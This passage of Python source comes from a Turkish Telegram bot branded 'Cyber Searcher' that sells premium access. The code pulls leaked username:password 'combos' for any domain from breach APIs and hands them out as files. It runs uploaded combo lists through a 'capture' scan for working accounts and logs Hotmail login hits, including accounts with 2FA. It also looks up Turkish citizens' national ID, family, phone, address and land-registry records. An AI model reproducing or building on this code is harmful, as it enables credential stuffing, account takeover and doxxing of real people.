    @bot_instance.message_handler(content_types=["successful_payment"])
    def payment_ok(msg):
        uid = msg.from_user.id
        username = msg.from_user.username or msg.from_user.first_name or str(uid)
        payload = msg.successful_payment.invoice_payload
        if payload.startswith("aiimg_"):
            pn = payload.replace("aiimg_", "")
            pm = {"25":(AI_IMG_PACK_25,AI_IMG_PRICE_25,"25 Hak"),"50":(AI_IMG_PACK_50,AI_IMG_PRICE_50,"50 Hak"),"250":(AI_IMG_PACK_250,AI_IMG_PRICE_250,"250 Hak")}
            if pn in pm:
                qty, stars, label = pm[pn]
                aiimg_add_credits(uid, qty)
                aiimg_log_purchase(uid, username, label, qty, stars)
                bot_instance.reply_to(msg,
                    f"🎉 <b>Ödeme Başarılı!</b>\n🎨 {label}\n➕ +{qty}\n💎 {aiimg_get_credits(uid)}",
                    parse_mode="HTML")
                try:
                    bot_instance.send_message(ADMIN_ID,
                        f"💰 <b>YENİ AI ALIM!</b>\n👤 @{esc(username)}\n📦 {label}", parse_mode="HTML")
                except: pass
            return
        if payload.startswith("tgid_"):
            pn = payload.replace("tgid_", "")
            pm = {"25":(TGID_PACKAGE_25,TGID_PRICE_25,"25 Sorgu"),"50":(TGID_PACKAGE_50,TGID_PRICE_50,"50 Sorgu"),"100":(TGID_PACKAGE_100,TGID_PRICE_100,"100 Sorgu")}
            if pn in pm:
                qty, stars, label = pm[pn]
                tgid_add_balance(uid, qty)
                tgid_log_purchase(uid, username, label, qty, stars)
                bot_instance.reply_to(msg,
                    f"🎉 <b>Ödeme Başarılı!</b>\n💎 {label}\n➕ +{qty}\n💰 {tgid_get_balance(uid)}",
                    parse_mode="HTML")
                try:
                    bot_instance.send_message(ADMIN_ID,
                        f"💰 <b>YENİ TG-ID ALIM!</b>\n👤 @{esc(username)}\n📦 {label}", parse_mode="HTML")
                except: pass
            return
        if payload == "premium":
            set_premium(uid, username)
            bot_instance.reply_to(msg, "🎉 <b>Premium aktif!</b>", parse_mode="HTML")
            bot_instance.send_message(ADMIN_ID, f"📧 <b>YENİ PREMIUM</b>\n👤 @{esc(username)}", parse_mode="HTML")
        elif payload == "osint":
            set_premium_osint(uid, username)
            bot_instance.reply_to(msg, "🌍 <b>OSINT Premium aktif!</b>", parse_mode="HTML")
            bot_instance.send_message(ADMIN_ID, f"🌍 <b>YENİ OSINT</b>\n👤 @{esc(username)}", parse_mode="HTML")

# ══════════════════════════════════════════════════════════════
#  PROCESS FUNCTIONS
# ══════════════════════════════════════════════════════════════
def _resolve_target(text):
    text = text.strip()
    if text.startswith("@"):
        row = find_user_by_username(text[1:])
        return (row[0], row[1]) if row else (None, None)
    elif text.isdigit():
        user_id = int(text)
        conn = sqlite3.connect(DB_PATH); c = conn.cursor()
        c.execute("SELECT user_id, username FROM users WHERE user_id=?", (user_id,))
        row = c.fetchone(); conn.close()
        return (row[0], row[1] or str(row[0])) if row else (user_id, str(user_id))
    return (None, None)

def _admin_premium_select_user(msg, bot_instance):
    tid, tuname = _resolve_target(msg.text.strip())
    if not tid:
        bot_instance.reply_to(msg, "❌ Bulunamadı!", parse_mode="HTML"); return
    add_user(tid, tuname or "", "Premium")
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn("📧 Hotmail Premium", f"adm_give_hotmail_{tid}_{tuname or tid}"),
           _btn("🌍 OSINT Premium", f"adm_give_osint_{tid}_{tuname or tid}"),
           _btn("📸 Capture Premium", f"adm_give_capture_{tid}_{tuname or tid}"))
    bot_instance.send_message(msg.chat.id,
        f"👤 @{esc(tuname or tid)} (ID: {tid})", reply_markup=mk, parse_mode="HTML")

def _admin_give_premium_hotmail(call, tid, tuname, bot_instance):
    if is_premium(tid):
        try: bot_instance.answer_callback_query(call.id, "ℹ️ Zaten Premium!", show_alert=True)
        except: pass
        return
    if set_premium(tid, tuname or str(tid)):
        try:
            bot_instance.edit_message_text(f"📧 @{esc(tuname or tid)} Hotmail Premium verildi!",
                                           call.message.chat.id, call.message.message_id, parse_mode="HTML")
            bot_instance.answer_callback_query(call.id, "✅")
        except: pass

def _admin_give_premium_osint(call, tid, tuname, bot_instance):
    if is_premium_osint(tid):
        try: bot_instance.answer_callback_query(call.id, "ℹ️ Zaten OSINT!", show_alert=True)
        except: pass
        return
    if set_premium_osint(tid, tuname or str(tid)):
        try:
            bot_instance.edit_message_text(f"🌍 @{esc(tuname or tid)} OSINT Premium verildi!",
                                           call.message.chat.id, call.message.message_id, parse_mode="HTML")
            bot_instance.answer_callback_query(call.id, "✅")
        except: pass

def _admin_give_premium_capture(call, tid, tuname, bot_instance):
    if is_premium(tid):
        try: bot_instance.answer_callback_query(call.id, "ℹ️ Zaten Premium!", show_alert=True)
        except: pass
        return
    if set_premium(tid, tuname or str(tid)):
        try:
            bot_instance.edit_message_text(f"📸 @{esc(tuname or tid)} Capture Premium verildi!",
                                           call.message.chat.id, call.message.message_id, parse_mode="HTML")
            bot_instance.answer_callback_query(call.id, "✅")
        except: pass

def _process_add_keyword(msg, bot_instance, uid):
    text = msg.text.strip()
    if not text:
        bot_instance.reply_to(msg, "❌ Boş!", parse_mode="HTML"); return
    nk = [k.strip().lower() for k in text.split(',') if k.strip()]
    if not nk:
        bot_instance.reply_to(msg, "❌ Geçersiz!", parse_mode="HTML"); return
    ck = get_user_keywords(uid); added = []; failed = []
    for kw in nk:
        if kw in ck: failed.append(f"'{esc(kw)}' var"); continue
        if not can_add_keyword(uid): failed.append("Limit!"); break
        ck.append(kw); added.append(kw)
    if added:
        set_user_keywords(uid, ck)
        bot_instance.reply_to(msg,
            f"✅ <b>Eklendi!</b>\n➕ {esc(', '.join(added))}\n📊 {esc(', '.join(ck))}", parse_mode="HTML")
    else:
        bot_instance.reply_to(msg, f"❌ <b>Eklenemedi:</b> {esc(', '.join(failed))}", parse_mode="HTML")

def _process_del_keyword(msg, bot_instance, uid):
    text = msg.text.strip().lower()
    if not text:
        bot_instance.reply_to(msg, "❌ Boş!", parse_mode="HTML"); return
    dk = [k.strip() for k in text.split(',') if k.strip()]
    ck = get_user_keywords(uid); rem = []; nf = []
    for kw in dk:
        if kw in ck: ck.remove(kw); rem.append(kw)
        else: nf.append(kw)
    if rem:
        set_user_keywords(uid, ck)
        rm = f"✅ <b>Silindi!</b>\n🗑️ {esc(', '.join(rem))}"
        if nf: rm += f"\n❌ {esc(', '.join(nf))}"
        rm += f"\n📊 {esc(', '.join(ck))}"
        bot_instance.reply_to(msg, rm, parse_mode="HTML")
    else:
        bot_instance.reply_to(msg, f"❌ <b>Bulunamadı:</b> {esc(', '.join(nf))}", parse_mode="HTML")

def _process_capture_file(msg, bot_instance, target_app):
    uid = msg.from_user.id
    if not msg.document:
        bot_instance.reply_to(msg, "❌ Dosya gönderin!", parse_mode="HTML"); return
    try:
        fi = bot_instance.get_file(msg.document.file_id)
        downloaded = bot_instance.download_file(fi.file_path)
        combo_text = downloaded.decode("utf-8", errors="ignore")
        combo_list = [l.strip() for l in combo_text.splitlines() if l.strip() and ":" in l.strip()]
        if not combo_list:
            bot_instance.reply_to(msg, "❌ Combo yok!", parse_mode="HTML"); return
        if not can_use_capture(uid):
            bot_instance.reply_to(msg, "❌ Hak doldu!", parse_mode="HTML"); return
        platform_name = "Tüm Platformlar"
        if target_app:
            for num, am in CAPTURE_APPS.items():
                if am == target_app: platform_name = CAPTURE_NAMES[num]; break
        increment_capture_used(uid)
        sm = bot_instance.reply_to(msg,
            f"📸 <b>Capture Başladı!</b>\n📂 {len(combo_list)} satır\n🎯 {platform_name}", parse_mode="HTML")
        def run_capture():
            un = get_user_name(uid); ip = is_premium(uid)
            start_capture_scan(combo_list, uid, un, ip, target_app)
            with CAPTURE_LOCK:
                results = CAPTURE_RESULTS.get(uid, []); bad = CAPTURE_BAD; proc = CAPTURE_PROCESSED
                if results:
                    try:
                        bot_instance.edit_message_text(
                            f"✅ <b>Capture Tamamlandı!</b>\n📊 Hit: {len(results)}\n❌ Bad: {bad}",
                            uid, sm.message_id, parse_mode="HTML")
                        if os.path.exists(f"capture_hits_{uid}.txt") and os.path.getsize(f"capture_hits_{uid}.txt") > 0:
                            with open(f"capture_hits_{uid}.txt", "rb") as f:
                                bot_instance.send_document(uid, f, caption=f"📸 {len(results)}x Hit")
                            os.remove(f"capture_hits_{uid}.txt")
                    except: pass
                else:
                    try:
                        bot_instance.edit_message_text(f"❌ Hit yok!\nİşlenen: {proc}", uid, sm.message_id, parse_mode="HTML")
                    except: pass
        threading.Thread(target=run_capture, daemon=True).start()
    except Exception as e:
        bot_instance.reply_to(msg, f"❌ {esc(e)}", parse_mode="HTML")

def _show_stats(chat_id, uid, bot_instance):
    row = get_user_stats(uid)
    if not row:
        bot_instance.send_message(chat_id, s(uid, "no_stats"), parse_mode="HTML"); return
    checks, combos, jd, is_prem, is_po, pd, pod, un, fn, kw, ib, br, cu = row
    daily = get_daily_usage(uid)
    limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
    txt = (f"{s(uid, 'stats_title')}\n{'─' * 30}\n"
           f"🔍 Sorgu: <b>{checks}</b>\n📦 Combo: <b>{combos}</b>\n"
           f"📧 Hotmail Premium: {'⭐' if is_prem else '❌'}\n"
           f"🌍 OSINT Premium: {'⭐' if is_po else '❌'}\n"
           f"🆔 TG-ID Free: {max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))}/{TGID_FREE_LIMIT}\n"
           f"💰 TG-ID Bakiye: {tgid_get_balance(uid)}\n"
           f"🎨 AI Free: {max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))}/{AI_IMG_FREE_LIMIT}\n"
           f"💎 AI Hak: {aiimg_get_credits(uid)}\n"
           f"📊 Günlük: {daily['checks']}/{limit}\n"
           f"📸 Capture: {cu}/{'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n"
           f"\n👨‍💻 @hackledin")
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

def _show_profile(chat_id, uid, bot_instance):
    row = get_user_stats(uid)
    if not row:
        bot_instance.send_message(chat_id, s(uid, "no_stats"), parse_mode="HTML"); return
    checks, combos, jd, is_prem, is_po, pd, pod, un, fn, kw, ib, br, cu = row
    user_name = esc(get_user_name(uid)); daily = get_daily_usage(uid)
    limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
    kl = kw.split(',') if kw else []
    tgid_free = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
    aiimg_free = max(0, AI_IMG_FREE_LIMIT - aiimg_get_free_used(uid))
    txt = (f"⚡️ <b>SİSTEME HOŞGELDİNİZ</b>\n"
           f"{user_name} — {uid}\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"👤 <b>PROFİL</b>\n"
           f"┣ Durum: {'🔴 YASAKLI' if ib else '🟢 Aktif'}\n"
           f"┗ Lisans: {'⭐ PREMIUM' if is_prem else '🆓 FREE'}\n"
           f"📊 <b>İSTATİSTİKLER</b>\n"
           f"┣ Günlük: {daily['checks']} / {limit}\n"
           f"┣ Toplam: {checks + combos}\n"
           f"┣ Keyword: {len(kl)} / {get_keyword_limit_text(uid)}\n"
           f"┗ Capture: {cu} / {'♾️' if is_prem else FREE_CAPTURE_LIMIT}\n"
           f"🆔 <b>TG-ID</b>\n"
           f"┣ Toplam: {tgid_get_total(uid)}\n┣ Free: {tgid_free}/{TGID_FREE_LIMIT}\n"
           f"┗ Bakiye: {tgid_get_balance(uid)}\n"
           f"🎨 <b>AI IMAGE</b>\n"
           f"┣ Toplam: {aiimg_get_total(uid)}\n┣ Free: {aiimg_free}/{AI_IMG_FREE_LIMIT}\n"
           f"┗ Hak: {aiimg_get_credits(uid)}\n"
           f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
           f"⭐ <b>PREMIUM</b>\n"
           f"📧 Hotmail: {'⭐' if is_prem else '❌'}\n"
           f"🌍 OSINT: {'⭐' if is_po else '❌'}\n"
           f"📅 {esc(pd or '—')}\n"
           f"👨‍💻 @hackledin")
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

def _show_leaderboard(chat_id, uid, bot_instance):
    conn = sqlite3.connect(DB_PATH); c = conn.cursor()
    c.execute("SELECT user_id,username,first_name,total_checks,total_combos,is_premium,is_premium_osint FROM users WHERE is_banned=0 ORDER BY total_combos DESC LIMIT 10")
    users = c.fetchall(); conn.close()
    if not users:
        bot_instance.send_message(chat_id, s(uid, "lb_title") + "\n❌ Veri yok.", parse_mode="HTML"); return
    medals = ["🥇","🥈","🥉","4️⃣","5️⃣","6️⃣","7️⃣","8️⃣","9️⃣","🔟"]
    txt = f"{s(uid, 'lb_title')}\n{'─' * 30}\n"
    for i, (ui, un, fn, tk, tc, ip, ipo) in enumerate(users):
        nm = esc((fn or un or str(ui))[:15])
        pk = "⭐" if (ip or ipo) else ""
        txt += f"{medals[i]} <b>{nm}</b> {pk}\n📦 {tc}  🔍 {tk}\n"
    txt += f"👨‍💻 @hackledin"
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

def _show_api_menu(chat_id, uid, bot_instance, edit=None):
    cur = api_pref(uid)
    cur_name = API_LIST[cur]["name"] if cur < len(API_LIST) else "Varsayılan"
    txt = s(uid, "api_title", cur=cur_name)
    mk = InlineKeyboardMarkup(row_width=1)
    for i, api in enumerate(API_LIST):
        ico = "✅" if i == cur else "◻️"
        mk.add(_btn(f"{ico} {api['name']}", f"setapi_{i}"))
    mk.add(_btn("🔄 Varsayılan", "setapi_default"))
    mk.add(_btn(s(uid, "home_btn"), "goto_home"))
    if edit:
        try:
            bot_instance.edit_message_text(txt, edit[0], edit[1], reply_markup=mk, parse_mode="HTML"); return
        except: pass
    bot_instance.send_message(chat_id, txt, reply_markup=mk, parse_mode="HTML")

def _show_help(chat_id, uid, bot_instance):
    status = "⭐ PREMIUM" if is_premium(uid) else "🆓 Ücretsiz"
    txt = s(uid, "help_content", status=status)
    bot_instance.send_message(chat_id, txt, parse_mode="HTML")

def _process_combo(msg, bot_instance):
    uid = msg.from_user.id
    txt = msg.text.strip().split()
    if not txt: return
    domain = txt[0].replace("http://", "").replace("https://", "").split("/")[0]
    limit = int(txt[1]) if len(txt) > 1 and txt[1].isdigit() else None
    sm = bot_instance.reply_to(msg, s(uid, "searching", domain=esc(domain)), parse_mode="HTML")
    combos, err, apis = _combo_engine(domain, limit)
    if err or not combos:
        bot_instance.edit_message_text(s(uid, "no_result", domain=esc(domain)), msg.chat.id, sm.message_id, parse_mode="HTML"); return
    update_stats(uid, len(combos))
    now = datetime.now()
    fname = f"{domain}_{now.strftime('%Y%m%d_%H%M%S')}.txt"
    with open(fname, "w", encoding="utf-8") as f:
        f.write(f"{'=' * 60}\nCYBER SEARCHER — {domain.upper()}\n{'=' * 60}\n")
        f.write(f" Toplam: {len(combos)}\nTarih: {now.strftime('%d.%m.%Y %H:%M')}\n{'=' * 60}\n")
        f.write("\n".join(combos))
        f.write(f"\n{'=' * 60}\n@hackledin\n")
    with open(fname, "rb") as f:
        bot_instance.send_document(msg.chat.id, f,
            caption=s(uid, "combo_caption", domain=esc(domain), count=len(combos), apis=esc(apis)), parse_mode="HTML")
    os.remove(fname)
    try: bot_instance.delete_message(msg.chat.id, sm.message_id)
    except: pass

def _combo_engine(domain, limit=None):
    for bad in YASAKLI:
        if bad in domain.lower(): return None, f"Yasaklı: {bad}", None
    combos = []; apis = []
    def _extract(line):
        line = str(line)
        m = re.search(r"://[^/]+/[^:]*:(.+?):(.+)$", line)
        if m: return m.group(1).strip(), m.group(2).strip()
        parts = line.split(":")
        if len(parts) >= 2: return parts[-2].strip(), parts[-1].strip()
        return None, None
    for api in API_LIST:
        try:
            r = requests.get(api["url"] + domain, headers={"User-Agent":"Mozilla/5.0"}, timeout=10, verify=False)
            if r.status_code != 200: continue
            data = r.json(); lines = []
            if api["type"] == "wazely": lines = data.get("foundLines", [])
            elif api["type"] == "solidar": lines = data.get("sonuclar", [])
            elif api["type"] == "rootturkey":
                raw = data.get("data","") if isinstance(data, dict) else r.text
                lines = raw.split("\n")
            for l in lines:
                u, p = _extract(l)
                if u and p: combos.append(f"{u}:{p}")
            apis.append(api["name"])
        except: pass
    uniq = list(set(combos))
    if limit: uniq = uniq[:limit]
    return uniq, None, " + ".join(apis)

def _process_turkey(msg, tool, bot_instance):
    uid = msg.from_user.id
    param = msg.text.strip()
    l = lang(uid)
    if tool in ("tc","tcpro","aile","ailepro","sulale","tcgsm","eokul","tapu","adres"):
        if not (param.isdigit() and len(param) == 11):
            bot_instance.reply_to(msg, s(uid, "invalid_tc"), parse_mode="HTML"); return
    elif tool == "gsmtc":
        clean = re.sub(r"\D", "", param).lstrip("0")
        if not (clean.isdigit() and len(clean) == 10):
            bot_instance.reply_to(msg, s(uid, "invalid_gsm"), parse_mode="HTML"); return
        param = clean
    elif tool == "adsoyad":
        if len(param.split()) < 2:
            bot_instance.reply_to(msg, s(uid, "invalid_adsoyad"), parse_mode="HTML"); return
    elif tool == "adaparsel":
        if "," not in param:
            bot_instance.reply_to(msg, s(uid, "invalid_adaparsel"), parse_mode="HTML"); return
    sm = bot_instance.reply_to(msg, s(uid, "processing"), parse_mode="HTML")
    api_cfg = TURKIYE_API[tool]; url = api_cfg["url"]
    if tool == "adsoyad":
        pts = param.split()
        url = url.replace("{ad}", pts[0]).replace("{soyad}", " ".join(pts[1:]))
    elif tool == "gsmtc": url = url.replace("{gsm}", param)
    elif tool == "adaparsel":
        pts = param.split(",")
        url = url.replace("{il}", pts[0].strip().upper()).replace("{ilce}", pts[1].strip().upper())
    else: url = url.replace("{tc}", param)
    data, err = _api_get(url)
    if err:
        bot_instance.edit_message_text(err, msg.chat.id, sm.message_id, parse_mode="HTML"); return
    result = _fmt_generic(f"{TURKIYE_API[tool]['icon']} {TURKIYE_API[tool][l]}", data, param, "Türkiye Sorgu")
    _send_txt_result(msg.chat.id, sm.message_id, bot_instance,
                     f"Turkey_{tool}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                     s(uid, "tr_caption", tool=esc(tool.upper()), param=esc(param)))

def _process_ls(msg, key, bot_instance):
    uid = msg.from_user.id
    val = msg.text.strip()
    if not val: return
    sm = bot_instance.reply_to(msg, s(uid, "processing"), parse_mode="HTML")
    info = LEAKSIGHTS_API[key]
    url = info["url"].replace("{value}", requests.utils.quote(val))
    data, err = _api_get(url)
    if err:
        bot_instance.edit_message_text(err, msg.chat.id, sm.message_id, parse_mode="HTML"); return
    l = lang(uid)
    title = f"{info['icon']} LeakSights — {info.get(l, info.get('tr', key))}"
    result = _fmt_generic(title, data, val, "LeakSights ⭐")
    _send_txt_result(msg.chat.id, sm.message_id, bot_instance,
                     f"LS_{key}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", result,
                     s(uid, "ls_caption", val=esc(val)))

def _api_get(url):
    try:
        r = requests.get(url, headers={"User-Agent":"Mozilla/5.0"}, timeout=20, verify=False)
        if r.status_code == 200:
            try: return r.json(), None
            except: return None, f"JSON: {esc(r.text[:300])}"
        return None, f"❌ HTTP {r.status_code}"
    except requests.Timeout: return None, "⏰ Timeout!"
    except Exception as e: return None, f"❌ {esc(e)}"

def _fmt_generic(title, data, queried, header_extra=""):
    now = datetime.now().strftime("%d.%m.%Y %H:%M:%S")
    lines = ["=" * 60, f" {title}", "=" * 60, f" Aranan  : {queried}", f" Tarih   : {now}", "=" * 60, ""]
    def _dump(obj, indent=0):
        prefix = "  " * indent
        if isinstance(obj, dict):
            for k, v in obj.items():
                if v is None or str(v).strip() == "": continue
                if isinstance(v, (dict, list)): lines.append(f"{prefix}• {k}:"); _dump(v, indent + 1)
                else: lines.append(f"{prefix}• {k}: {v}")
        elif isinstance(obj, list):
            for i, item in enumerate(obj, 1):
                lines.append(f"{prefix}[{i}]"); _dump(item, indent + 1); lines.append("")
        else:
            if str(obj).strip(): lines.append(f"{prefix}{obj}")
    _dump(data)
    lines += ["", "=" * 60, f" {header_extra} — Cyber Searcher", " @hackledin", "=" * 60]
    return "\n".join(lines)

def _send_txt_result(chat_id, status_mid, bot_instance, fname, content, caption):
    try:
        with open(fname, "w", encoding="utf-8") as f: f.write(content)
        with open(fname, "rb") as f: bot_instance.send_document(chat_id, f, caption=caption, parse_mode="HTML")
        os.remove(fname)
        try: bot_instance.delete_message(chat_id, status_mid)
        except: pass
    except Exception as e:
        try: bot_instance.edit_message_text(f"❌ {esc(e)}", chat_id, status_mid, parse_mode="HTML")
        except: pass

def _process_addbot(msg, bot_instance):
    uid = msg.from_user.id
    token = msg.text.strip()
    if len(token) < 30:
        bot_instance.reply_to(msg, "❌ Geçersiz token!", parse_mode="HTML"); return
    if token == BOT_TOKEN:
        bot_instance.reply_to(msg, "❌ Ana bot token'ı!", parse_mode="HTML"); return
    with _PROC_LOCK:
        if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
            bot_instance.reply_to(msg, s(uid, "multi_bot_exists"), parse_mode="HTML"); return
        try:
            success = _spawn_bot(token, uid)
            if success:
                bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=esc(token[:20] + "...")), parse_mode="HTML")
            else:
                bot_instance.reply_to(msg, "❌ Başlatılamadı!", parse_mode="HTML")
        except Exception as e:
            bot_instance.reply_to(msg, f"❌ {esc(e)}", parse_mode="HTML")

def _process_special_tool(msg, tool, bot_instance):
    uid = msg.from_user.id; val = msg.text.strip()
    sm = bot_instance.reply_to(msg, s(uid, "processing"), parse_mode="HTML")
    if tool == "proxycheck": result = _proxycheck(val)
    else:
        domain = val.replace("http://", "").replace("https://", "").split("/")[0]
        result = _urlscan(domain)
    if len(result) > 4000:
        for i in range(0, len(result), 4000):
            try: bot_instance.send_message(msg.chat.id, f"<pre>{esc(result[i:i+4000])}</pre>", parse_mode="HTML")
            except: bot_instance.send_message(msg.chat.id, result[i:i+4000])
        try: bot_instance.delete_message(msg.chat.id, sm.message_id)
        except: pass
    else:
        try: bot_instance.edit_message_text(f"<pre>{esc(result)}</pre>", msg.chat.id, sm.message_id, parse_mode="HTML")
        except: bot_instance.edit_message_text(result, msg.chat.id, sm.message_id)

def _process_generic_tool(msg, tool, bot_instance):
    uid = msg.from_user.id; val = msg.text.strip()
    sm = bot_instance.reply_to(msg, s(uid, "processing"), parse_mode="HTML")
    try:
        resp = requests.get(TOOLS_API[tool] + val, timeout=15, verify=False)
        try: out = json.dumps(resp.json(), indent=2, ensure_ascii=False)
        except: out = resp.text
        try:
            bot_instance.edit_message_text(f"✅ <b>{esc(tool.upper())}</b>\n<pre>{esc(out[:3800])}</pre>",
                                           msg.chat.id, sm.message_id, parse_mode="HTML")
        except:
            bot_instance.edit_message_text(f"{tool.upper()}\n{out[:3800]}", msg.chat.id, sm.message_id)
    except Exception as e:
        bot_instance.edit_message_text(f"❌ {esc(e)}", msg.chat.id, sm.message_id, parse_mode="HTML")

def _proxycheck(ip):
    try:
        r = requests.get(f"https://proxycheck.io/v3/{ip}?vpn=1&asn=1&risk=1&port=1", timeout=15, verify=False)
        if r.status_code != 200: return f"❌ HTTP {r.status_code}"
        d = r.json()
        if ip not in d: return "❌ IP yok."
        info = d[ip]; loc = info.get("location", {}); det = info.get("detections", {})
        return (f"= 60\n 🛡️ PROXYCHECK.IO\n{'=' * 60}\n IP: {ip}\n\n"
                f" Ülke : {loc.get('country_name', '—')}\n Şehir: {loc.get('city_name', '—')}\n"
                f" Proxy: {'⚠️' if det.get('proxy') else '✅'}\n VPN: {'⚠️' if det.get('vpn') else '✅'}\n"
                f" Risk : {det.get('risk', 0)}%\n{'=' * 60}\n @hackledin")
    except Exception as e: return f"❌ {e}"

def _urlscan(domain):
    try:
        r = requests.get(f"https://urlscan.io/api/v1/search/?q={domain}",
                         headers={"User-Agent":"Mozilla/5.0"}, timeout=15, verify=False)
        if r.status_code != 200: return f"❌ HTTP {r.status_code}"
        results = r.json().get("results", [])
        if not results: return f"🔍 {domain} sonuç yok."
        lines = ["=" * 60, f" 🔍 URLSCAN — {domain}", "=" * 60, ""]
        for i, res in enumerate(results[:5], 1):
            t = res.get("task", {}); p = res.get("page", {})
            lines += [f" #{i}", f"  URL : {t.get('url', '—')}", f"  IP  : {p.get('ip', '—')}", ""]
        lines += ["=" * 60, " @hackledin", "=" * 60]
        return "\n".join(lines)
    except Exception as e: return f"❌ {e}"

def _run_predunyam(chat_id, uid, bot_instance):
    try:
        r = requests.get(TOOLS_API["predunyam"], timeout=10, verify=False)
        bot_instance.send_message(chat_id, f"💎 <b>PreDunyam</b>\n<pre>{esc(r.text[:3500])}</pre>", parse_mode="HTML")
    except Exception as e:
        bot_instance.send_message(chat_id, f"❌ {esc(e)}", parse_mode="HTML")

def _handle_admin_cb(call, action, bot_instance):
    uid = call.from_user.id; cid = call.message.chat.id; mid = call.message.message_id
    try:
        if action == "stats":
            tu, pp, op, tc, tch = get_bot_stats()
            txt = (f"📊 <b>İSTATİSTİK</b>\n"
                   f"👥 {tu}\n📧 Hotmail: {pp or 0}\n🌍 OSINT: {op or 0}\n"
                   f"📦 Combo: {tc or 0}\n🔍 Sorgu: {tch or 0}")
            try: bot_instance.edit_message_text(txt, cid, mid, parse_mode="HTML")
            except: bot_instance.send_message(cid, txt, parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "prem_users":
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT user_id,username,first_name,premium_date FROM users WHERE is_premium=1 OR is_premium_osint=1")
            users = c.fetchall(); conn.close()
            if not users:
                try: bot_instance.answer_callback_query(call.id, "Yok.")
                except: pass
                return
            txt = "⭐ <b>PREMIUM</b>\n"
            for ui, un, fn, pd in users: txt += f"👤 @{esc(un or fn or ui)}\n"
            try: bot_instance.edit_message_text(txt[:4000], cid, mid, parse_mode="HTML")
            except: bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "prem_log":
            logs = get_premium_logs(20)
            if not logs:
                try: bot_instance.answer_callback_query(call.id, "Log yok.")
                except: pass
                return
            txt = "📋 <b>LOG</b>\n"
            for ui, un, pkg, amt, dt in logs:
                txt += f"👤 @{esc(un or ui)} 📦 {pkg} 💰 {amt}⭐\n"
            try: bot_instance.edit_message_text(txt[:4000], cid, mid, parse_mode="HTML")
            except: bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "give_premium":
            m = bot_instance.send_message(cid, "⭐ <b>Premium Ver</b>\nID veya @kullanıcıadı:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_premium_select_user(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action.startswith("give_hotmail_"):
            p = action.split("_"); tid = int(p[2]); tun = p[3] if len(p) > 3 else str(tid)
            _admin_give_premium_hotmail(call, tid, tun, bot_instance); return
        elif action.startswith("give_osint_"):
            p = action.split("_"); tid = int(p[2]); tun = p[3] if len(p) > 3 else str(tid)
            _admin_give_premium_osint(call, tid, tun, bot_instance); return
        elif action.startswith("give_capture_"):
            p = action.split("_"); tid = int(p[2]); tun = p[3] if len(p) > 3 else str(tid)
            _admin_give_premium_capture(call, tid, tun, bot_instance); return
        elif action == "remove":
            m = bot_instance.send_message(cid, "👤 <b>Premium Kaldır</b>\nID veya @kullanıcıadı:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_remove(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "ban":
            m = bot_instance.send_message(cid, "🚫 Banlanacak kullanıcı:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_ban(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "unban":
            m = bot_instance.send_message(cid, "✅ Banı kaldırılacak:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_unban(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "banned":
            banned = get_banned_users()
            if not banned: bot_instance.send_message(cid, "📭 Yok.", parse_mode="HTML")
            else:
                txt = "🚫 <b>YASAKLI</b>\n"
                for ui, un, fn, rs in banned: txt += f"👤 @{esc(un or fn or ui)}\n📌 {esc(rs)}\n"
                bot_instance.send_message(cid, txt[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "announce":
            m = bot_instance.send_message(cid, "📢 Duyuru:", parse_mode="HTML")
            bot_instance.register_next_step_handler(m, lambda m: _admin_announce(m, bot_instance))
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "listbots":
            registry = _load_registry()
            if not registry: bot_instance.send_message(cid, s(uid, "multi_bot_no_bots"), parse_mode="HTML")
            else:
                lines = [s(uid, "multi_bot_list"), "─" * 30]
                for tk, info in registry.items():
                    with _PROC_LOCK:
                        proc = _CHILD_PROCS.get(tk)
                        status = s(uid, "multi_bot_running") if proc and proc.poll() is None else s(uid, "multi_bot_stopped")
                    lines.append(f"🔑 <code>{esc(tk)}</code>")
                    lines.append(f"   {status} PID: {info.get('pid', '—')}")
                bot_instance.send_message(cid, "\n".join(lines)[:4000], parse_mode="HTML")
            try: bot_instance.answer_callback_query(call.id)
            except: pass
            return
        elif action == "hotmail_log":
            logs = get_hotmail_logs(30)
            if not logs: bot_instance.send_message(cid, "📭 Yok.", parse_mode="HTML")
            else:
                txt = "📋 <b>HOTMAIL LOG</b>\n"
                for ui, un, em, pw, st, dt, dt2 in logs:
                    ico = "✅" if st == "HIT" else "🔐" if st == "2FA" else "❌"
                    txt += f"{ico} @{esc(un or ui)} | {esc(em)}\n"
